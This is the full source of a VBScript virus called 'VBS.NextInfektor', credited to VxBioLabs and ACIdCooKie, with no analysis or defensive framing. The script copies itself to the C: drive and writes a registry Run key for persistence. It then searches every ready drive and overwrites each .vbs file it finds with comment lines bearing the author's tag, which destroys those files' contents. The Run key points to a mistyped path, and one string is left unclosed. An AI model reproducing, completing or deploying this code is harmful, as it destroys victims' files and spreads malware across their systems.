'VBS.NextInfektor
on error resume next
Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set Fso=createobject("scripting.filesystemobject") 
Set w = fso.GetFile(WScript.ScriptFullName)
w.Copy ("C:\SysPath.vbs")
Set vrc2 = CreateObject( "WScript.Shell" )
vrc2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "SysPath", ("C:\SysPath.vbs.vbs")
Set Drives=fso.drives
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
Next 
'coded by ACIdCooKie / www.vxbiolabs.cjb.net
Function Dosearch(Path) 
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files 
If fso.GetExtensionName(file.path)="vbs" then 
Set Script = Fso.CreateTextFile(file.path, True)
Script.Writeline "'I'm next infektor"
Script.Writeline "'This file infect / VBS.NextInfektor / www.vxbiolabs.cjb.net"
Script.Writeline "'Coded by VxBioLabs - ACIDCOOKIE
Script.Close
end If 
Next 
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function
'VBS.NextInfektor
'VxBioLabs - Specie and ACIdCooKie
